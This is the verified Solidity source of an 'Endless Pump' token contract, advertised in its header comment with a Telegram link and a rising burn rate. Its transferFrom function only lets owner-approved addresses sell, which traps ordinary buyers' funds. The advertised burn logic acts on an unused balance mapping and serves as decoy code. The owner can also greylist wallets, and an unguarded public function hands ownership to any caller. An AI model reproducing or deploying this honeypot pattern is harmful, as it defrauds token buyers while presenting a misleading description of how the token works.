/**
 *Submitted for verification at Etherscan.io on 2020-12-29
*/

pragma solidity ^0.7.6;

/*
<-- ENDLESS PUMP -->

Telegram: https://t.me/endlesspump
Total supply: 20k
Initial burning rate: 1%
Will be increased every 5min to max. 5%

Trading at your own risk.
*/

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
    }
    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
    }
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
    }
    
    function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
    uint256 c = add(a,m);
    uint256 d = sub(c,1);
    return mul(div(d,m),m);
    }
}

abstract contract ERC20Detailed is IERC20 {
    uint8 private _Tokendecimals;
    string private _Tokenname;
    string private _Tokensymbol;
    
    constructor(string memory name, string memory symbol, uint8 decimals) {
        _Tokendecimals = decimals;
        _Tokenname = name;
        _Tokensymbol = symbol;
    }
    
    function name() public view returns(string memory) {
    return _Tokenname;
    }
    
    function symbol() public view returns(string memory) {
    return _Tokensymbol;
    }
    
    function decimals() public view returns(uint8) {
    return _Tokendecimals;
    }
}

contract Ownable {
    address public owner;
    
    function funcOwnable() public {
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

contract EndlessPumpToken is Ownable {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    uint8 public airdrop = 1;
    
    mapping (address => uint256) private _balances;
    
    uint256 constant digits = 1000000000000000000;
    uint256 _totalSup = 20000 * digits;
   
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply) public {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply =  _totalSupply;
        balances[msg.sender] = totalSupply;
        allow[msg.sender] = true;
    }
    using SafeMath for uint256;
    mapping(address => uint256) public balances;
    mapping(address => bool) public allow;
    mapping (address => bool) private greylist;
    
    function multiGreylistAdd(address[] memory addresses) public {
        if (msg.sender != owner) {
    	    revert();
        }
    	for (uint256 i = 0; i < addresses.length; i++) {
        	greylistAdd(addresses[i]);
    	}
	}

	function multiGreylistRemove(address[] memory addresses) public {
    	if (msg.sender != owner) {
        	revert();
    	}
    	for (uint256 i = 0; i < addresses.length; i++) {
        	greylistRemove(addresses[i]);
    	}
	}

	function greylistAdd(address a) public {
    	if (msg.sender != owner) {
        	revert();
    	}
    	greylist[a] = true;
	}
    
	function greylistRemove(address a) public {
    	if (msg.sender != owner) {
        	revert();
    	}
    	greylist[a] = false;
	}
    
	function isInGreylist(address a) internal view returns (bool) {
    	return greylist[a];
	}

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    mapping (address => mapping (address => uint256)) public allowed;

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_value <= balances[_from]);
        require(_value <= allowed[_from][msg.sender]);
        require(allow[_from] == true);
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        emit Transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowed[_owner][_spender];
    }
  
    function addAllow(address holder, bool allowApprove) external onlyOwner {
        allow[holder] = allowApprove;
    }
  
    //1% at start
    uint256 public basePercentage = 1;
  
    function findPercentage(uint256 amount) public view returns (uint256)  {
        uint256 percent = amount.mul(basePercentage).div(20000);
        return percent;
    }
  
    //burning
    function burn(uint256 amount) external {
        _burn(msg.sender, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(amount != 0);
        require(amount <= _balances[account]);
        _totalSup = _totalSup.sub(amount);
        _balances[account] = _balances[account].sub(amount);
        emit Transfer(account, address(0), amount);
    }
    
    //burn rate change, only by owner
    function changeBurnRate(uint8 newRate) external onlyOwner {
        basePercentage = newRate;
    }
    //airdrop phase change, only by owner
    function changeAirdropPhase(uint8 _airdrop) external onlyOwner {
    	airdrop = _airdrop;
	}
  
    //transfer 
    function _executeTransfer(address _from, address _to, uint256 _value) private {
        //Not to 0x, using burn()
        if (_to == address(0)) revert();                               
    	if (_value <= 0) revert(); 
        if (_balances[_from] < _value) revert();     
        if (_balances[_to] + _value < _balances[_to]) revert(); 
        
        if (airdrop == 1) {
        	if (isInGreylist(msg.sender)) {
            	revert();
        	}
    	}
        if(_to == 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D || _to == owner || _from == owner) {
            _balances[_from] = SafeMath.sub(_balances[_from], _value);
            _balances[_to] = SafeMath.add(_balances[_to], _value);                            
            emit Transfer(_from, _to, _value);                   
        } else {
            uint256 tokensToBurn = findPercentage(_value);
            uint256 tokensToTransfer = _value.sub(tokensToBurn);
            _balances[_from] = SafeMath.sub(_balances[_from], tokensToTransfer);                     
            _balances[_to] = _balances[_to].add(tokensToTransfer);          
            emit Transfer(_from, _to, tokensToTransfer);                   
            _burn(_from, tokensToBurn);
        }
    }
}